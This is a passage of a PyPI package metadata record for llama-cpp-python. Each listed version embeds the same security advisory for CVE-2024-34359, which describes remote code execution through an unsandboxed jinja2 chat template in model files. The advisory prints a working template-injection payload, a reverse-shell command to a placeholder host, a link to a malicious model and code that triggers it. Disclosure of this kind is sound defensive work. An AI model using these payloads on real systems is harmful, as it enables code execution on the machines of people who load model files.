3.9"],"description_content_type":"text/markdown","docs_url":null,"download_url":null,"downloads":{"last_day":-1,"last_month":-1,"last_week":-1},"dynamic":null,"home_page":null,"keywords":null,"license":"MIT","maintainer":null,"maintainer_email":null,"name":"llama-cpp-python","package_url":"https://pypi.org/project/llama-cpp-python/","platform":null,"project_url":"https://pypi.org/project/llama-cpp-python/","project_urls":{"Changelog":"https://llama-cpp-python.readthedocs.io/en/latest/changelog/","Documentation":"https://llama-cpp-python.readthedocs.io/en/latest/","Homepage":"https://github.com/abetlen/llama-cpp-python","Issues":"https://github.com/abetlen/llama-cpp-python/issues"},"provides_extra":null,"release_url":"https://pypi.org/project/llama-cpp-python/0.2.62/","requires_dist":["typing-extensions>=4.5.0","numpy>=1.20.0","diskcache>=5.6.1","jinja2>=2.11.3","uvicorn>=0.22.0; extra == \"server\"","fastapi>=0.100.0; extra == \"server\"","pydantic-settings>=2.0.1; extra == \"server\"","sse-starlette>=1.6.1; extra == \"server\"","starlette-context<0.4,>=0.3.6; extra == \"server\"","PyYAML>=5.1; extra == \"server\"","pytest>=7.4.0; extra == \"test\"","httpx>=0.24.1; extra == \"test\"","scipy>=1.10; extra == \"test\"","black>=23.3.0; extra == \"dev\"","twine>=4.0.2; extra == \"dev\"","mkdocs>=1.4.3; extra == \"dev\"","mkdocstrings[python]>=0.22.0; extra == \"dev\"","mkdocs-material>=9.1.18; extra == \"dev\"","pytest>=7.4.0; extra == \"dev\"","httpx>=0.24.1; extra == \"dev\"","llama_cpp_python[dev,server,test]; extra == \"all\""],"requires_python":">=3.8","summary":"Python bindings for the llama.cpp library","version":"0.2.62","yanked":false,"yanked_reason":null},"last_serial":25247474,"urls":[{"comment_text":"","digests":{"blake2b_256":"29e6bdf6e894b12fbf7ad88bf2aa77fdc4135be773910cd59944b0b254170793","md5":"7af03b38509fa21e169ba26c997b3b13","sha256":"f58a9d13d71d38e9c2bb5891c05200ab413f40e1543a875b7043417ec0307c27"},"downloads":-1,"filename":"llama_cpp_python-0.2.62.tar.gz","has_sig":false,"md5_digest":"7af03b38509fa21e169ba26c997b3b13","packagetype":"sdist","python_version":"source","requires_python":">=3.8","size":37480185,"upload_time":"2024-04-18T05:45:50","upload_time_iso_8601":"2024-04-18T05:45:50.899663Z","url":"https://files.pythonhosted.org/packages/29/e6/bdf6e894b12fbf7ad88bf2aa77fdc4135be773910cd59944b0b254170793/llama_cpp_python-0.2.62.tar.gz","yanked":false,"yanked_reason":null}],"vulnerabilities":[{"aliases":["CVE-2024-34359"],"details":"## Description\n\n`llama-cpp-python` depends on class `Llama` in `llama.py` to load `.gguf` llama.cpp or Latency Machine Learning Models. The `__init__` constructor built in the `Llama` takes several parameters to configure the loading and running of the model. Other than `NUMA, LoRa settings`, `loading tokenizers,` and `hardware settings`, `__init__` also loads the `chat template` from targeted `.gguf` 's Metadata and furtherly parses it to `llama_chat_format.Jinja2ChatFormatter.to_chat_handler()` to construct the `self.chat_handler` for this model. Nevertheless, `Jinja2ChatFormatter` parse the `chat template` within the Metadate with sandbox-less `jinja2.Environment`, which is furthermore rendered in `__call__` to construct the `prompt` of interaction. This allows `jinja2` Server Side Template Injection which leads to RCE by a carefully constructed payload.\n\n## Source-to-Sink\n\n### `llama.py` -> `class Llama` -> `__init__`:\n\n```python\nclass Llama:\n    \"\"\"High-level Python wrapper for a llama.cpp model.\"\"\"\n\n    __backend_initialized = False\n\n    def __init__(\n        self,\n        model_path: str,\n\t\t# lots of params; Ignoring\n    ):\n \n        self.verbose = verbose\n\n        set_verbose(verbose)\n\n        if not Llama.__backend_initialized:\n            with suppress_stdout_stderr(disable=verbose):\n                llama_cpp.llama_backend_init()\n            Llama.__backend_initialized = True\n\n\t\t# Ignoring lines of unrelated codes.....\n\n        try:\n            self.metadata = self._model.metadata()\n        except Exception as e:\n            self.metadata = {}\n            if self.verbose:\n                print(f\"Failed to load metadata: {e}\", file=sys.stderr)\n\n        if self.verbose:\n            print(f\"Model metadata: {self.metadata}\", file=sys.stderr)\n\n        if (\n            self.chat_format is None\n            and self.chat_handler is None\n            and \"tokenizer.chat_template\" in self.metadata\n        ):\n            chat_format = llama_chat_format.guess_chat_format_from_gguf_metadata(\n                self.metadata\n            )\n\n            if chat_format is not None:\n                self.chat_format = chat_format\n                if self.verbose:\n                    print(f\"Guessed chat format: {chat_format}\", file=sys.stderr)\n            else:\n                template = self.metadata[\"tokenizer.chat_template\"]\n                try:\n                    eos_token_id = int(self.metadata[\"tokenizer.ggml.eos_token_id\"])\n                except:\n                    eos_token_id = self.token_eos()\n                try:\n                    bos_token_id = int(self.metadata[\"tokenizer.ggml.bos_token_id\"])\n                except:\n                    bos_token_id = self.token_bos()\n\n                eos_token = self._model.token_get_text(eos_token_id)\n                bos_token = self._model.token_get_text(bos_token_id)\n\n                if self.verbose:\n                    print(f\"Using gguf chat template: {template}\", file=sys.stderr)\n                    print(f\"Using chat eos_token: {eos_token}\", file=sys.stderr)\n                    print(f\"Using chat bos_token: {bos_token}\", file=sys.stderr)\n\n                self.chat_handler = llama_chat_format.Jinja2ChatFormatter(\n                    template=template,\n                    eos_token=eos_token,\n                    bos_token=bos_token,\n                    stop_token_ids=[eos_token_id],\n                ).to_chat_handler()\n\n        if self.chat_format is None and self.chat_handler is None:\n            self.chat_format = \"llama-2\"\n            if self.verbose:\n                print(f\"Using fallback chat format: {chat_format}\", file=sys.stderr)\n                \n```\n\nIn `llama.py`, `llama-cpp-python` defined the fundamental class for model initialization parsing (Including `NUMA, LoRa settings`, `loading tokenizers,` and stuff ). In our case, we will be focusing on the parts where it processes `metadata`; it first checks if `chat_format` and `chat_handler` are `None` and checks if the key `tokenizer.chat_template` exists in the metadata dictionary `self.metadata`. If it exists, it will try to guess the `chat format` from the `metadata`. If the guess fails, it will get the value of `chat_template` directly from `self.metadata.self.metadata` is set during class initialization and it tries to get the metadata by calling the model's metadata() method, after that, the `chat_template` is parsed into `llama_chat_format.Jinja2ChatFormatter` as params which furthermore stored the `to_chat_handler()` as `chat_handler`\n\n### `llama_chat_format.py` -> `Jinja2ChatFormatter`:\n\n`self._environment =  jinja2.Environment( -> from_string(self.template) -> self._environment.render(`\n\n```python\nclass ChatFormatter(Protocol):\n    \"\"\"Base Protocol for a chat formatter. A chat formatter is a function that\n    takes a list of messages and returns a chat format response which can be used\n    to generate a completion. The response can also include a stop token or list\n    of stop tokens to use for the completion.\"\"\"\n\n    def __call__(\n        self,\n        *,\n        messages: List[llama_types.ChatCompletionRequestMessage],\n        **kwargs: Any,\n    ) -> ChatFormatterResponse: ...\n\n\nclass Jinja2ChatFormatter(ChatFormatter):\n    def __init__(\n        self,\n        template: str,\n        eos_token: str,\n        bos_token: str,\n        add_generation_prompt: bool = True,\n        stop_token_ids: Optional[List[int]] = None,\n    ):\n        \"\"\"A chat formatter that uses jinja2 templates to format the prompt.\"\"\"\n        self.template = template\n        self.eos_token = eos_token\n        self.bos_token = bos_token\n        self.add_generation_prompt = add_generation_prompt\n        self.stop_token_ids = set(stop_token_ids) if stop_token_ids is not None else None\n\n        self._environment = jinja2.Environment(\n            loader=jinja2.BaseLoader(),\n            trim_blocks=True,\n            lstrip_blocks=True,\n        ).from_string(self.template)\n\n    def __call__(\n        self,\n        *,\n        messages: List[llama_types.ChatCompletionRequestMessage],\n        functions: Optional[List[llama_types.ChatCompletionFunction]] = None,\n        function_call: Optional[llama_types.ChatCompletionRequestFunctionCall] = None,\n        tools: Optional[List[llama_types.ChatCompletionTool]] = None,\n        tool_choice: Optional[llama_types.ChatCompletionToolChoiceOption] = None,\n        **kwargs: Any,\n    ) -> ChatFormatterResponse:\n        def raise_exception(message: str):\n            raise ValueError(message)\n\n        prompt = self._environment.render(\n            messages=messages,\n            eos_token=self.eos_token,\n            bos_token=self.bos_token,\n            raise_exception=raise_exception,\n            add_generation_prompt=self.add_generation_prompt,\n            functions=functions,\n            function_call=function_call,\n            tools=tools,\n            tool_choice=tool_choice,\n        )\n\n```\n\nAs we can see in `llama_chat_format.py` -> `Jinja2ChatFormatter`, the constructor `__init__` initialized required `members` inside of the class; Nevertheless, focusing on this line:\n\n```python\n        self._environment = jinja2.Environment(\n            loader=jinja2.BaseLoader(),\n            trim_blocks=True,\n            lstrip_blocks=True,\n        ).from_string(self.template)\n```\n\nFun thing here: `llama_cpp_python` directly loads the `self.template` (`self.template = template` which is the `chat template` located in the `Metadate` that is parsed as a param) via `jinja2.Environment.from_string(` without setting any sandbox flag or using the protected `immutablesandboxedenvironment `class. This is extremely unsafe since the attacker can implicitly tell `llama_cpp_python` to load malicious `chat template` which is furthermore rendered in the `__call__` constructor, allowing RCEs or Denial-of-Service since `jinja2`'s renderer evaluates embed codes like `eval()`, and we can utilize expose method by exploring the attribution such as `__globals__`, `__subclasses__` of pretty much anything.\n\n```python\n    def __call__(\n        self,\n        *,\n        messages: List[llama_types.ChatCompletionRequestMessage],\n        functions: Optional[List[llama_types.ChatCompletionFunction]] = None,\n        function_call: Optional[llama_types.ChatCompletionRequestFunctionCall] = None,\n        tools: Optional[List[llama_types.ChatCompletionTool]] = None,\n        tool_choice: Optional[llama_types.ChatCompletionToolChoiceOption] = None,\n        **kwargs: Any,\n    ) -> ChatFormatterResponse:\n        def raise_exception(message: str):\n            raise ValueError(message)\n\n        prompt = self._environment.render( # rendered!\n            messages=messages,\n            eos_token=self.eos_token,\n            bos_token=self.bos_token,\n            raise_exception=raise_exception,\n            add_generation_prompt=self.add_generation_prompt,\n            functions=functions,\n            function_call=function_call,\n            tools=tools,\n            tool_choice=tool_choice,\n        )\n```\n\n## Exploiting\n\nFor our exploitation, we first downloaded [qwen1_5-0_5b-chat-q2_k.gguf](https://huggingface.co/Qwen/Qwen1.5-0.5B-Chat-GGUF/blob/main/qwen1_5-0_5b-chat-q2_k.gguf) of `Qwen/Qwen1.5-0.5B-Chat-GGUF` on `huggingface` as the base of the exploitation, by importing the file to `Hex-compatible` editors (In my case I used the built-in `Hex editor` or `vscode`), you can try to search for key `chat_template` (imported as `template = self.metadata[\"tokenizer.chat_template\"]` in `llama-cpp-python`):\n\n<img src=\"https://raw.githubusercontent.com/retr0reg/0reg-uploads/main/img/202405021808647.png\" alt=\"image-20240502180804562\" style=\"zoom: 25%;\" />\n\n`qwen1_5-0_5b-chat-q2_k.gguf` appears to be using the OG `role+message` and using the fun `jinja2` syntax. By first replacing the original `chat_template` in `\\x00`, then inserting our SSTI payload. We constructed this payload which firstly iterates over the subclasses of the base class of all classes in Python. The expression `().__class__.__base__.__subclasses__()` retrieves a list of all subclasses of the basic `object` class and then we check if its `warning` by `if \"warning\" in x.__name__`, if it is , we access its module via the `_module` attribute then access Python's built-in functions through `__builtins__` and uses the `__import__` function to import the `os` module and finally we called `os.popen` to `touch /tmp/retr0reg`, create an empty file call `retr0reg` under `/tmp/`\n\n```python\n{% for x in ().__class__.__base__.__subclasses__() %}{% if \"warning\" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen(\"touch /tmp/retr0reg\")}}{%endif%}{% endfor %}\n```\n\nin real life exploiting instance, we can change `touch /tmp/retr0reg` into arbitrary codes like `sh -i >& /dev/tcp/<HOST>/<PORT> 0>&1` to create a reverse shell connection to specified host, in our case we are using `touch /tmp/retr0reg` to showcase the exploitability of this vulnerability.\n\n<img src=\"https://raw.githubusercontent.com/retr0reg/0reg-uploads/main/img/202405022009159.png\" alt=\"image-20240502200909127\" style=\"zoom:50%;\" />\n\nAfter these steps, we got ourselves a malicious model with an embedded payload in `chat_template` of the `metahead`, in which will be parsed and rendered by `llama.py:class Llama:init ->  self.chat_handler `-> `llama_chat_format.py:Jinja2ChatFormatter:init ->  self._environment = jinja2.Environment(` -> ``llama_chat_format.py:Jinja2ChatFormatter:call -> self._environment.render(`\n\n*(The uploaded malicious model file is in https://huggingface.co/Retr0REG/Whats-up-gguf )*\n\n```python\nfrom llama_cpp import Llama\n\n# Loading locally:\nmodel = Llama(model_path=\"qwen1_5-0_5b-chat-q2_k.gguf\")\n# Or loading from huggingface:\nmodel = Llama.from_pretrained(\n    repo_id=\"Retr0REG/Whats-up-gguf\",\n    filename=\"qwen1_5-0_5b-chat-q2_k.gguf\",\n    verbose=False\n)\n\nprint(model.create_chat_completion(messages=[{\"role\": \"user\",\"content\": \"what is the meaning of life?\"}]))\n```\n\nNow when the model is loaded whether as ` Llama.from_pretrained` or `Llama` and chatted, our malicious code in the `chat_template` of the `metahead` will be triggered and execute arbitrary code. \n\nPoC video here: https://drive.google.com/file/d/1uLiU-uidESCs_4EqXDiyKR1eNOF1IUtb/view?usp=sharing\n","fixed_in":["0.2.72"],"id":"GHSA-56xg-wfcc-g829","link":"https://osv.dev/vulnerability/GHSA-56xg-wfcc-g829","source":"osv","summary":null,"withdrawn":null}]},"0.2.63":{"info":{"author":null,"author_email":"Andrei Betlen <abetlen@gmail.com>","bugtrack_url":null,"classifiers":["Programming Language :: Python :: 3","Programming Language :: Python :: 3.10","Programming Language :: Python :: 3.11","Programming Language :: Python :: 3.12","Programming Language :: Python :: 3.8","Programming Language :: Python :: 3.9"],"description_content_type":"text/markdown","docs_url":null,"download_url":null,"downloads":{"last_day":-1,"last_month":-1,"last_week":-1},"dynamic":null,"home_page":null,"keywords":null,"license":"MIT","maintainer":null,"maintainer_email":null,"name":"llama-cpp-python","package_url":"https://pypi.org/project/llama-cpp-python/","platform":null,"project_url":"https://pypi.org/project/llama-cpp-python/","project_urls":{"Changelog":"https://llama-cpp-python.readthedocs.io/en/latest/changelog/","Documentation":"https://llama-cpp-python.readthedocs.io/en/latest/","Homepage":"https://github.com/abetlen/llama-cpp-python","Issues":"https://github.com/abetlen/llama-cpp-python/issues"},"provides_extra":null,"release_url":"https://pypi.org/project/llama-cpp-python/0.2.63/","requires_dist":["typing-extensions>=4.5.0","numpy>=1.20.0","diskcache>=5.6.1","jinja2>=2.11.3","uvicorn>=0.22.0; extra == \"server\"","fastapi>=0.100.0; extra == \"server\"","pydantic-settings>=2.0.1; extra == \"server\"","sse-starlette>=1.6.1; extra == \"server\"","starlette-context<0.4,>=0.3.6; extra == \"server\"","PyYAML>=5.1; extra == \"server\"","pytest>=7.4.0; extra == \"test\"","httpx>=0.24.1; extra == \"test\"","scipy>=1.10; extra == \"test\"","black>=23.3.0; extra == \"dev\"","twine>=4.0.2; extra == \"dev\"","mkdocs>=1.4.3; extra == \"dev\"","mkdocstrings[python]>=0.22.0; extra == \"dev\"","mkdocs-material>=9.1.18; extra == \"dev\"","pytest>=7.4.0; extra == \"dev\"","httpx>=0.24.1; extra == \"dev\"","llama_cpp_python[dev,server,test]; extra == \"all\""],"requires_python":">=3.8","summary":"Python bindings for the llama.cpp library","version":"0.2.63","yanked":false,"yanked_reason":null},"last_serial":25247474,"urls":[{"comment_text":"","digests":{"blake2b_256":"d9381f7328b3b9f156246a91ed9a5902c64d8c7dd877b97977afdac95815bd9e","md5":"d0992ff225ae72db12bb87a52832f8aa","sha256":"26425fd77a8c463bac709c1d4b8194d7c4ddca3d795f82b2ae7ff4246f2f5539"},"downloads":-1,"filename":"llama_cpp_python-0.2.63.tar.gz","has_sig":false,"md5_digest":"d0992ff225ae72db12bb87a52832f8aa","packagetype":"sdist","python_version":"source","requires_python":">=3.8","size":37489858,"upload_time":"2024-04-20T04:11:51","upload_time_iso_8601":"2024-04-20T04:11:51.971182Z","url":"https://files.pythonhosted.org/packages/d9/38/1f7328b3b9f156246a91ed9a5902c64d8c7dd877b97977afdac95815bd9e/llama_cpp_python-0.2.63.tar.gz","yanked":false,"yanked_reason":null}],"vulnerabilities":[{"aliases":["CVE-2024-34359"],"details":"## Description\n\n`llama-cpp-python` depends on class `Llama` in `llama.py` to load `.gguf` llama.cpp or Latency Machine Learning Models. The `__init__` constructor built in the `Llama` takes several parameters to configure the loading and running of the model. Other than `NUMA, LoRa settings`, `loading tokenizers,` and `hardware settings`, `__init__` also loads the `chat template` from targeted `.gguf` 's Metadata and furtherly parses it to `llama_chat_format.Jinja2ChatFormatter.to_chat_handler()` to construct the `self.chat_handler` for this model. Nevertheless, `Jinja2ChatFormatter` parse the `chat template` within the Metadate with sandbox-less `jinja2.Environment`, which is furthermore rendered in `__call__` to construct the `prompt` of interaction. This allows `jinja2` Server Side Template Injection which leads to RCE by a carefully constructed payload.\n\n## Source-to-Sink\n\n### `llama.py` -> `class Llama` -> `__init__`:\n\n```python\nclass Llama:\n    \"\"\"High-level Python wrapper for a llama.cpp model.\"\"\"\n\n    __backend_initialized = False\n\n    def __init__(\n        self,\n        model_path: str,\n\t\t# lots of params; Ignoring\n    ):\n \n        self.verbose = verbose\n\n        set_verbose(verbose)\n\n        if not Llama.__backend_initialized:\n            with suppress_stdout_stderr(disable=verbose):\n                llama_cpp.llama_backend_init()\n            Llama.__backend_initialized = True\n\n\t\t# Ignoring lines of unrelated codes.....\n\n        try:\n            self.metadata = self._model.metadata()\n        except Exception as e:\n            self.metadata = {}\n            if self.verbose:\n                print(f\"Failed to load metadata: {e}\", file=sys.stderr)\n\n        if self.verbose:\n            print(f\"Model metadata: {self.metadata}\", file=sys.stderr)\n\n        if (\n            self.chat_format is None\n            and self.chat_handler is None\n            and \"tokenizer.chat_template\" in self.metadata\n        ):\n            chat_format = llama_chat_format.guess_chat_format_from_gguf_metadata(\n                self.metadata\n            )\n\n            if chat_format is not None:\n                self.chat_format = chat_format\n                if self.verbose:\n                    print(f\"Guessed chat format: {chat_format}\", file=sys.stderr)\n            else:\n                template = self.metadata[\"tokenizer.chat_template\"]\n                try:\n                    eos_token_id = int(self.metadata[\"tokenizer.ggml.eos_token_id\"])\n                except:\n                    eos_token_id = self.token_eos()\n                try:\n                    bos_token_id = int(self.metadata[\"tokenizer.ggml.bos_token_id\"])\n                except:\n                    bos_token_id = self.token_bos()\n\n                eos_token = self._model.token_get_text(eos_token_id)\n                bos_token = self._model.token_get_text(bos_token_id)\n\n                if self.verbose:\n                    print(f\"Using gguf chat template: {template}\", file=sys.stderr)\n                    print(f\"Using chat eos_token: {eos_token}\", file=sys.stderr)\n                    print(f\"Using chat bos_token: {bos_token}\", file=sys.stderr)\n\n                self.chat_handler = llama_chat_format.Jinja2ChatFormatter(\n                    template=template,\n                    eos_token=eos_token,\n                    bos_token=bos_token,\n                    stop_token_ids=[eos_token_id],\n                ).to_chat_handler()\n\n        if self.chat_format is None and self.chat_handler is None:\n            self.chat_format = \"llama-2\"\n            if self.verbose:\n                print(f\"Using fallback chat format: {chat_format}\", file=sys.stderr)\n                \n```\n\nIn `llama.py`, `llama-cpp-python` defined the fundamental class for model initialization parsing (Including `NUMA, LoRa settings`, `loading tokenizers,` and stuff ). In our case, we will be focusing on the parts where it processes `metadata`; it first checks if `chat_format` and `chat_handler` are `None` and checks if the key `tokenizer.chat_template` exists in the metadata dictionary `self.metadata`. If it exists, it will try to guess the `chat format` from the `metadata`. If the guess fails, it will get the value of `chat_template` directly from `self.metadata.self.metadata` is set during class initialization and it tries to get the metadata by calling the model's metadata() method, after that, the `chat_template` is parsed into `llama_chat_format.Jinja2ChatFormatter` as params which furthermore stored the `to_chat_handler()` as `chat_handler`\n\n### `llama_chat_format.py` -> `Jinja2ChatFormatter`:\n\n`self._environment =  jinja2.Environment( -> from_string(self.template) -> self._environment.render(`\n\n```python\nclass ChatFormatter(Protocol):\n    \"\"\"Base Protocol for a chat formatter. A chat formatter is a function that\n    takes a list of messages and returns a chat format response which can be used\n    to generate a completion. The response can also include a stop token or list\n    of stop tokens to use for the completion.\"\"\"\n\n    def __call__(\n        self,\n        *,\n        messages: List[llama_types.ChatCompletionRequestMessage],\n        **kwargs: Any,\n    ) -> ChatFormatterResponse: ...\n\n\nclass Jinja2ChatFormatter(ChatFormatter):\n    def __init__(\n        self,\n        template: str,\n        eos_token: str,\n        bos_token: str,\n        add_generation_prompt: bool = True,\n        stop_token_ids: Optional[List[int]] = None,\n    ):\n        \"\"\"A chat formatter that uses jinja2 templates to format the prompt.\"\"\"\n        self.template = template\n        self.eos_token = eos_token\n        self.bos_token = bos_token\n        self.add_generation_prompt = add_generation_prompt\n        self.stop_token_ids = set(stop_token_ids) if stop_token_ids is not None else None\n\n        self._environment = jinja2.Environment(\n            loader=jinja2.BaseLoader(),\n            trim_blocks=True,\n            lstrip_blocks=True,\n        ).from_string(self.template)\n\n    def __call__(\n        self,\n        *,\n        messages: List[llama_types.ChatCompletionRequestMessage],\n        functions: Optional[List[llama_types.ChatCompletionFunction]] = None,\n        function_call: Optional[llama_types.ChatCompletionRequestFunctionCall] = None,\n        tools: Optional[List[llama_types.ChatCompletionTool]] = None,\n        tool_choice: Optional[llama_types.ChatCompletionToolChoiceOption] = None,\n        **kwargs: Any,\n    ) -> ChatFormatterResponse:\n        def raise_exception(message: str):\n            raise ValueError(message)\n\n        prompt = self._environment.render(\n            messages=messages,\n            eos_token=self.eos_token,\n            bos_token=self.bos_token,\n            raise_exception=raise_exception,\n            add_generation_prompt=self.add_generation_prompt,\n            functions=functions,\n            function_call=function_call,\n            tools=tools,\n            tool_choice=tool_choice,\n        )\n\n```\n\nAs we can see in `llama_chat_format.py` -> `Jinja2ChatFormatter`, the constructor `__init__` initialized required `members` inside of the class; Nevertheless, focusing on this line:\n\n```python\n        self._environment = jinja2.Environment(\n            loader=jinja2.BaseLoader(),\n            trim_blocks=True,\n            lstrip_blocks=True,\n        ).from_string(self.template)\n```\n\nFun thing here: `llama_cpp_python` directly loads the `self.template` (`self.template = template` which is the `chat template` located in the `Metadate` that is parsed as a param) via `jinja2.Environment.from_string(` without setting any sandbox flag or using the protected `immutablesandboxedenvironment `class. This is extremely unsafe since the attacker can implicitly tell `llama_cpp_python` to load malicious `chat template` which is furthermore rendered in the `__call__` constructor, allowing RCEs or Denial-of-Service since `jinja2`'s renderer evaluates embed codes like `eval()`, and we can utilize expose method by exploring the attribution such as `__globals__`, `__subclasses__` of pretty much anything.\n\n```python\n    def __call__(\n        self,\n        *,\n        messages: List[llama_types.ChatCompletionRequestMessage],\n        functions: Optional[List[llama_types.ChatCompletionFunction]] = None,\n        function_call: Optional[llama_types.ChatCompletionRequestFunctionCall] = None,\n        tools: Optional[List[llama_types.ChatCompletionTool]] = None,\n        tool_choice: Optional[llama_types.ChatCompletionToolChoiceOption] = None,\n        **kwargs: Any,\n    ) -> ChatFormatterResponse:\n        def raise_exception(message: str):\n            raise ValueError(message)\n\n        prompt = self._environment.render( # rendered!\n            messages=messages,\n            eos_token=self.eos_token,\n            bos_token=self.bos_token,\n            raise_exception=raise_exception,\n            add_generation_prompt=self.add_generation_prompt,\n            functions=functions,\n            function_call=function_call,\n            tools=tools,\n            tool_choice=tool_choice,\n        )\n```\n\n## Exploiting\n\nFor our exploitation, we first downloaded [qwen1_5-0_5b-chat-q2_k.gguf](https://huggingface.co/Qwen/Qwen1.5-0.5B-Chat-GGUF/blob/main/qwen1_5-0_5b-chat-q2_k.gguf) of `Qwen/Qwen1.5-0.5B-Chat-GGUF` on `huggingface` as the base of the exploitation, by importing the file to `Hex-compatible` editors (In my case I used the built-in `Hex editor` or `vscode`), you can try to search for key `chat_template` (imported as `template = self.metadata[\"tokenizer.chat_template\"]` in `llama-cpp-python`):\n\n<img src=\"https://raw.githubusercontent.com/retr0reg/0reg-uploads/main/img/202405021808647.png\" alt=\"image-20240502180804562\" style=\"zoom: 25%;\" />\n\n`qwen1_5-0_5b-chat-q2_k.gguf` appears to be using the OG `role+message` and using the fun `jinja2` syntax. By first replacing the original `chat_template` in `\\x00`, then inserting our SSTI payload. We constructed this payload which firstly iterates over the subclasses of the base class of all classes in Python. The expression `().__class__.__base__.__subclasses__()` retrieves a list of all subclasses of the basic `object` class and then we check if its `warning` by `if \"warning\" in x.__name__`, if it is , we access its module via the `_module` attribute then access Python's built-in functions through `__builtins__` and uses the `__import__` function to import the `os` module and finally we called `os.popen` to `touch /tmp/retr0reg`, create an empty file call `retr0reg` under `/tmp/`\n\n```python\n{% for x in ().__class__.__base__.__subclasses__() %}{% if \"warning\" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen(\"touch /tmp/retr0reg\")}}{%endif%}{% endfor %}\n```\n\nin real life exploiting instance, we can change `touch /tmp/retr0reg` into arbitrary codes like `sh -i >& /dev/tcp/<HOST>/<PORT> 0>&1` to create a reverse shell connection to specified host, in our case we are using `touch /tmp/retr0reg` to showcase the exploitability of this vulnerability.\n\n<img src=\"https://raw.githubusercontent.com/retr0reg/0reg-uploads/main/img/202405022009159.png\" alt=\"image-20240502200909127\" style=\"zoom:50%;\" />\n\nAfter these steps, we got ourselves a malicious model with an embedded payload in `chat_template` of the `metahead`, in which will be parsed and rendered by `llama.py:class Llama:init ->  self.chat_handler `-> `llama_chat_format.py:Jinja2ChatFormatter:init ->  self._environment = jinja2.Environment(` -> ``llama_chat_format.py:Jinja2ChatFormatter:call -> self._environment.render(`\n\n*(The uploaded malicious model file is in https://huggingface.co/Retr0REG/Whats-up-gguf )*\n\n```python\nfrom llama_cpp import Llama\n\n# Loading locally:\nmodel = Llama(model_path=\"qwen1_5-0_5b-chat-q2_k.gguf\")\n# Or loading from huggingface:\nmodel = Llama.from_pretrained(\n    repo_id=\"Retr0REG/Whats-up-gguf\",\n    filename=\"qwen1_5-0_5b-chat-q2_k.gguf\",\n    verbose=False\n)\n\nprint(model.create_chat_completion(messages=[{\"role\": \"user\",\"content\": \"what is the meaning of life?\"}]))\n```\n\nNow when the model is loaded whether as ` Llama.from_pretrained` or `Llama` and chatted, our malicious code in the `chat_template` of the `metahead` will be triggered and execute arbitrary code. \n\nPoC video here: https://drive.google.com/file/d/1uLiU-uidESCs_4EqXDiyKR1eNOF1IUtb/view?usp=sharing\n","fixed_in":["0.2.72"],"id":"GHSA-56xg-wfcc-g829","link":"https://osv.dev/vulnerability/GHSA-56xg-wfcc-g829","source":"osv","summary":null,"withdrawn":null}]},"0.2.64":{"info":{"author":null,"author_email":"Andrei Betlen <abetlen@gmail.com>","bugtrack_url":null,"classifiers":["Programming Language :: Python :: 3","Programming Language :: Python :: 3.10","Programming Language :: Python :: 3.11","Programming Language :: Python :: 3.12","Programming Language :: Python :: 3.8","Programming Language :: Python :: 3.9"],"description_content_type":"text/markdown","docs_url":null,"download_url":null,"downloads":{"last_day":-1,"last_month":-1,"last_week":-1},"dynamic":null,"home_page":null,"keywords":null,"license":"MIT","maintainer":null,"maintainer_email":null,"name":"llama-cpp-python","package_url":"https://pypi.org/project/llama-cpp-python/","platform":null,"project_url":"https://pypi.org/project/llama-cpp-python/","project_urls":{"Changelog":"https://llama-cpp-python.readthedocs.io/en/latest/changelog/","Documentation":"https://llama-cpp-python.readthedocs.io/en/latest/","Homepage":"https://github.com/abetlen/llama-cpp-python","Issues":"https://github.com/abetlen/llama-cpp-python/issues"},"provides_extra":null,"release_url":"https://pypi.org/project/llama-cpp-python/0.2.64/","requires_dist":["typing-extensions>=4.5.0","numpy>=1.20.0","diskcache>=5.6.1","jinja2>=2.11.3","uvicorn>=0.22.0; extra == \"server\"","fastapi>=0.100.0; extra == \"server\"","pydantic-settings>=2.0.1; extra == \"server\"","sse-starlette>=1.6.1; extra == \"server\"","starlette-context<0.4,>=0.3.6; extra == \"server\"","PyYAML>=5.1; extra == \"server\"","pytest>=7.4.0; extra == \"test\"","httpx>=0.24.1; extra == \"test\"","scipy>=1.10; extra == \"test\"","black>=23.3.0; extra == \"dev\"","twine>=4.0.2; extra == \"dev\"","mkdocs>=1.4.3; extra == \"dev\"","mkdocstrings[python]>=0.22.0; extra == \"dev\"","mkdocs-material>=9.1.18; extra == \"dev\"","pytest>=7.4.0; extra == \"dev\"","httpx>=0.24.1; extra == \"dev\"","llama_cpp_python[dev,server,test]; extra == \"all\""],"requires_python":">=3.8","summary":"Python bindings for the llama.cpp library","version":"0.2.64","yanked":false,"yanked_reason":null},"last_serial":25247474,"urls":[{"comment_text":"","digests":{"blake2b_256":"6ec89903231ca2f9279b1469b970e846f15aa0c287a96c5946148b65137b437c","md5":"3abfcbbebc7fc2b98c43f78e137575b6","sha256":"a638fe6b0d36d62db01c8e872ae25a31f2fd483438ed4f0096f8ac281c940201"},"downloads":-1,"filename":"llama_cpp_python-0.2.64.tar.gz","has_sig":false,"md5_digest":"3abfcbbebc7fc2b98c43f78e137575b6","packagetype":"sdist","python_version":"source","requires_python":">=3.8","size":37373548,"upload_time":"2024-04-23T06:56:09","upload_time_iso_8601":"2024-04-23T06:56:09.477618Z","url":"https://files.pythonhosted.org/packages/6e/c8/9903231ca2f9279b1469b970e846f15aa0c287a96c5946148b65137b437c/llama_cpp_python-0.2.64.tar.gz","yanked":false,"yanked_reason":null}],"vulnerabilities":[{"aliases":["CVE-2024-34359"],"details":"## Description\n\n`llama-cpp-python` depends on class `Llama` in `llama.py` to load `.gguf` llama.cpp or Latency Machine Learning Models. The `__init__` constructor built in the `Llama` takes several parameters to configure the loading and running of the model. Other than `NUMA, LoRa settings`, `loading tokenizers,` and `hardware settings`, `__init__` also loads the `chat template` from targeted `.gguf` 's Metadata and furtherly parses it to `llama_chat_format.Jinja2ChatFormatter.to_chat_handler()` to construct the `self.chat_handler` for this model. Nevertheless, `Jinja2ChatFormatter` parse the `chat template` within the Metadate with sandbox-less `jinja2.Environment`, which is furthermore rendered in `__call__` to construct the `prompt` of interaction. This allows `jinja2` Server Side Template Injection which leads to RCE by a carefully constructed payload.\n\n## Source-to-Sink\n\n### `llama.py` -> `class Llama` -> `__init__`:\n\n```python\nclass Llama:\n    \"\"\"High-level Python wrapper for a llama.cpp model.\"\"\"\n\n    __backend_initialized = False\n\n    def __init__(\n        self,\n        model_path: str,\n\t\t# lots of params; Ignoring\n    ):\n \n        self.verbose = verbose\n\n        set_verbose(verbose)\n\n        if not 